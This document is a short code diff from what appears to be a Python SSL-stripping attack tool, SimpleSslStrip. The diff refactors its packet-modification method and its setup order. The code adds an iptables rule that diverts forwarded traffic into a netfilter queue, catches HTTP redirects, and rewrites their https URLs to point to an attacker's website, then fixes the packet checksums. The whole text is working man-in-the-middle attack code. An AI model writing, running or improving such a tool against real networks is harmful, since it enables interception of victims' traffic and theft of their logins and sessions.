@@ -28,20 +28,20 @@ class SimpleSslStrip:
 
             # checks if it is a http redirect
             if my_load.find("301") != -1 or my_load.find("302") != -1:
-                my_packet = self.modify_packet(my_packet, my_load)
+                my_packet = self.modify(my_packet, my_load)
                 packet.set_payload(bytes(my_packet))
 
         packet.accept()
 
     # modify the http redirect package to redirect to the desired atacker's website
-    def modify_packet(self, packet, load):
+    def modify(self, packet, load):
         pattern = b"https://[^/]+"
         replacement = "http://{}".format(self.attacker_website_redirect)
         replacement = replacement.encode("ascii")
 
-        load = re.sub(pattern, replacement, load.encode('latin-1')).decode('latin-1')
+        load = re.sub(pattern, replacement, load.encode('latin-1'))
 
-        packet[Raw].load = load.encode('latin-1')
+        packet[Raw].load = load
         packet[TCP].chksum = None
         packet[TCP].dataofs = None
         packet[IP].len = None
@@ -51,10 +51,9 @@ class SimpleSslStrip:
 
     # execute the strip
     def execute_stripping(self):
+        the_queue = NetfilterQueue()
         QUEUE_NUMBER = 5
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))
-
-        the_queue = NetfilterQueue()
 
         try:
             the_queue.bind(QUEUE_NUMBER, self.process_http_response)
